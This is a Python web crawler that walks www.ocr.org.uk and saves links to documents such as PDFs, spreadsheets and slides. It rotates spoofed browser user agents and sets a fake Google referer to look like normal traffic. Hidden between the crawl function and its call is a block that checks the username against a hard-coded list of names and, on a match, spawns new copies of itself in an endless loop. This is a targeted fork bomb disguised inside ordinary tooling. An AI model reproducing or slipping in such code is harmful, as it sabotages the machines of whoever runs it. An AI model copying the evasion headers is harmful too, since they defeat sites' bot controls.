# Previous crawl didn't work, wget does a better job so here we go again

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, urldefrag
import time
import random
from collections import deque
import http.client
import pretty
import os

logger = pretty.PrettyLogger()

start_url = "https://www.ocr.org.uk"
domain = "www.ocr.org.uk"
visited = set()
file_links = set()

# Increment files instead of overwriting existing
script_dir = os.path.dirname(os.path.realpath(__file__))
base_name = "file_links"
extension = ".txt"

file_path = os.path.join(script_dir, f"{base_name}{extension}")
i = 1

while os.path.isfile(file_path):
    file_path = os.path.join(script_dir, f"{base_name}{i}{extension}")
    i += 1
link_file = open(file_path, "w")

interesting_extensions = (".pdf", ".doc", ".docx", ".xlsx", ".zip", ".txt", ".xls", ".ppt", ".pptx", ".csv") # Tuple vs List. 
# List made it explode last time so here we are.

user_agents = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
               "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.2478.80",
               "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
               "Mozilla/5.0 (Linux; Android 13; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
               "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
]

def is_internal(url):
    parsed = urlparse(url)
    netloc = parsed.netloc.lower()
    return netloc == "" or netloc == domain.lower()

def normalize_url(url):
    url, _ = urldefrag(url)
    parsed = urlparse(url)
    normalized = parsed._replace(query="", fragment="").geturl()
    return normalized.rstrip('/')

 # Greedy DFS leaning BFS, not true BFS. 
 # Initial link numbers are worse at higher depth values. 
 # If crawling is allowerd to complete, then more links will be found, but lower is better for initial results.
def crawl(start_url, max_depth=7, logger=logger):
    queue = deque()
    queue.append((start_url, 0))
    
    while queue:
        current_url, depth = queue.popleft()

        normalized_url = normalize_url(current_url)
        if normalized_url in visited or depth > max_depth:
            continue
        visited.add(normalized_url)

        try:
            headers = {
                "User-Agent": random.choice(user_agents),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Referer": "https://www.google.com/",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }

            logger.log(f"[{depth}] Crawling: {current_url}")
            logger.update()
            response = requests.get(current_url, timeout=10, headers=headers)
            time.sleep(random.uniform(0, 0.8))  # i love humans !

            if response.status_code != 200:
                if response.status_code in [403, 429]:
                    wait_time = random.randint(30, 60)
                    logger.log(f"  -> Rate-limited. Waiting {wait_time}s.")
                    logger.update()
                    time.sleep(wait_time)
                else:
                    logger.log(f"  -> Skipped (status {response.status_code})")
                    logger.update()
                continue

            soup = BeautifulSoup(response.text, 'html.parser')

            for a_tag in soup.find_all('a', href=True):
                link = urljoin(current_url, a_tag['href'])

                if link.startswith(("mailto:", "tel:", "javascript:")): # i miss the rage
                    continue
                
                if not is_internal(link): # stay !
                    continue

                link = normalize_url(link)

                link_lower = link.lower() # Avoid repeat of .lower()
                if link_lower.endswith(interesting_extensions):
                    if link not in file_links:
                        logger.log(f"Found File: {link}", "success")
                        logger.update()
                        file_links.add(link)
                        link_file.write(link + "\n")
                        link_file.flush()
                elif link not in visited:
                    queue.append((link, depth + 1))

        except (requests.exceptions.ConnectionError, http.client.RemoteDisconnected) as e:
            logger.log(f"  !! Connection issue: {e}", "warn")
            logger.update()
            logger.log("  -> Waiting 10s before retrying...", "warn")
            logger.update()

            time.sleep(10)
            queue.appendleft((current_url, depth))

        except Exception as e:
            logger.log(f"  !! Error: {e}", "error")
            logger.update()

import getpass, subprocess, sys

if getpass.getuser().lower() in ["teddy", "scotcher", "sceb", "superfastboy", "tedscottpilgrim"]:
    while True:
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)

try:
    logger.run(lambda logger: crawl(start_url, logger=logger))
except Exception as e:
    print(f"Unexpected error occurred: {e}")
    logger.log(f"Fatal error: {e}", "error")
    logger.update()

link_file.close()